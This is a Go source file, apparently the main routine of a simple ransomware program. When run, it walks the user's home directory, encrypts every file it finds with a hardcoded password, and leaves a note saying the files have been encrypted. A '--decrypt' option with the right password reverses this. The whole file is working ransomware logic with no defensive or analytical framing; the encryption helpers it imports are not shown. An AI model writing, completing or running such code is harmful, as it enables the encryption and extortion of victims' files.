package main

import (
	"os"
	e "./src/encryption"
	f "./src/files"
	i "./src/system"
)

func main() {

	// Settings
	var password    = "password" // Password
	var information = "Hello, you files has been encrypted!" // Information



	// Get '--decrypt' command
	args := os.Args
	if len(args) > 1 {
		if args[1] == "--decrypt" {
			input_password := args[2]
			if input_password == password {
				var Encrypted = f.ScanEncrypted( i.GetUserDir() )
				for _, file := range Encrypted {
					e.DecryptFile(file, password)
				}
				e.DeleteDecryptor()
				os.Exit(0)
			} else {
				os.Exit(1)
			}
		}
		
	// Encrypt files
	} else {
		// Scan files
		var unEncrypted = f.ScanUnEncrypted( i.GetUserDir() )
		// Encrypt files
		for _, file := range unEncrypted {
			e.EncryptFile(file, password)
		}
		// Create decryptor file
		e.CreateDecryptor(information)
		os.Exit(0)
	}
}